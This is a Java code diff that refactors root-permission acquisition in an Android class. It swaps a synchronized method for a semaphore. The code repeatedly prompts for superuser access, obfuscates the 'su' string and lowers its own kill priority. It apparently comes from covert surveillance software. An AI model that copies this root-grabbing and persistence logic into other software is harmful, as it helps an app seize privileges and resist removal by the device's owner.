@@ -44,6 +44,7 @@ public class Root {
 	private static int askedSu = 0;
 	private static boolean oom_adjusted;
 	private final static String SU = M.e("su");
+	static Semaphore semGetPermission = new Semaphore(1);
 
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
@@ -688,62 +689,71 @@ public class Root {
 			}
 		}
 	}
+	/*
+	 * Removed synchronized in favour of using a semaphore,
+	 * With synchronized two successive calls at the same method
+	 * will happen on sequence, while using the semaphore only one will
+	 * succeed.
+	 */
+	static public boolean getPermissions() {
 
-	static synchronized public boolean getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
 
-		// Abbiamo la root?
-		//PackageInfo.checkRoot();
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
-					+ Keys.self().wantsPrivilege());
-		}
-
-		boolean ask = false;
-
-		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
-			ask = true;
-		}
-
-		if (ask && askedSu < Cfg.MAX_ASKED_SU) {
-			askedSu += 1;
-
+		if (!semGetPermission.tryAcquire()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getPermissions), ask the user, number " + askedSu);
+				Check.log(TAG + "  getPermissions() already asking permission");
+			}
+			return false;
+		}
+		try{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
+						+ Keys.self().wantsPrivilege());
 			}
 
-			// Ask the user...
-			Root.supersuRoot();
-			if (!PackageInfo.checkRoot()) {
+			boolean ask = false;
+
+			if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
+				ask = true;
+			}
+
+			if (ask && askedSu < Cfg.MAX_ASKED_SU) {
+				askedSu += 1;
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getPermissions), ask the user, number " + askedSu);
+				}
+
+				// Ask the user...
 				Root.supersuRoot();
+
+				if (PackageInfo.checkRoot()) {
+					Status.self().setReload();
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getPermissions), don't ask: asked " + askedSu + " times");
+				}
 			}
 
-			if(PackageInfo.checkRoot()) {
-				Status.self().setReload();
+			if (Status.haveRoot()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
+				}
+			} else {
+				Configuration.shellFile = Configuration.shellFileBase;
 			}
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
-			}
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getPermissions), don't ask: asked " + askedSu + " times");
-			}
+			// Avoid having the process killed for using too many resources
+			Root.adjustOom();
+		}finally{
+			semGetPermission.release();
 		}
-
-		if (Status.haveRoot()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
-			}
-		} else {
-			Configuration.shellFile = Configuration.shellFileBase;
-		}
-
-		// Avoid having the process killed for using too many resources
-		Root.adjustOom();
-
 		return Status.haveRoot();
 	}
 
